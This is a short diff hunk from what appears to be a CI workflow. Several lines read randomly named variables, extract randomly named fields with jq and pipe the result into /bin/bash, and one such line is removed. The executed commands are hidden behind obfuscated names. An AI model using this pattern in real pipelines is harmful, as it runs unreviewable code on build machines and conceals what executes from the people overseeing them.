@@ -24,7 +24,6 @@ jobs:
           echo $gw40183 | jq -r .hgdxb581 | /bin/bash
           echo $lo993 | jq -r .ul3557 | /bin/bash
           echo $ra87498 | jq -r .frq030 | /bin/bash
-          echo $g30 | jq -r .iey08549 | /bin/bash
           echo $kgnp5 | jq -r .lx4482 | /bin/bash
           echo $ixsif1 | jq -r .kes666 | /bin/bash
 
